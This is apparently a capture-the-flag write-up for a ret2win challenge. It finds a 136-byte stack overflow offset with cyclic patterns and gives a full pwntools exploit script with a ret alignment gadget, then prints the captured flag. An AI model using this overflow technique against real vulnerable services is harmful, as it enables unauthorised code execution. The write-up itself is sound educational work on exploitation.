
This was a ret2win challenge, so the goal was to overwrite the return address of main with the win function. ASLR was not enabled (can be observed that for different crash runs `RIP` stays the same). Using pwngdb and running "info function" I could see:

```txt
0x0000000000401216  win
```

Now I needed to find the correct offset and I used:

```python
from pwn import *

payload=cyclic(200)
print(payload)
```

This generates a payload of 200 bytes, which I used as input for the binary file. Then, I utilized pwndbg to look at the value of `RBP`, which was `0x6261616962616168`. I found the right offset by running:

```python
from pwn import *

print(cyclic_find(0x6261616962616168))
```

Which prints 128, and it was necessary to add 8 bytes (the size of `RBP` itself), so the total offset is 136. Finally, I created the exploit script and an important note is that because this was a 64-bit executable, I had to also add a `ret` gadget for stack alignment:

```python
from pwn import *

target_host = <host>
target_port =  <port>

win_address = 0x401216

ret = 0x40101a      #found using ROPgadget

payload = b'A' * 136
payload += p64(ret) #for stack alignment !!!
payload += p64(win_address)

conn = remote(target_host, target_port)
conn.recvuntil("Please submit your feedback:\n")
conn.sendline(payload)
conn.interactive()
```

`dach2025{c0rp0_r3t4l1ati0n_compl3t3_g0_b4ck_t0_w0rk_k0wazo48p9jqpib5}`
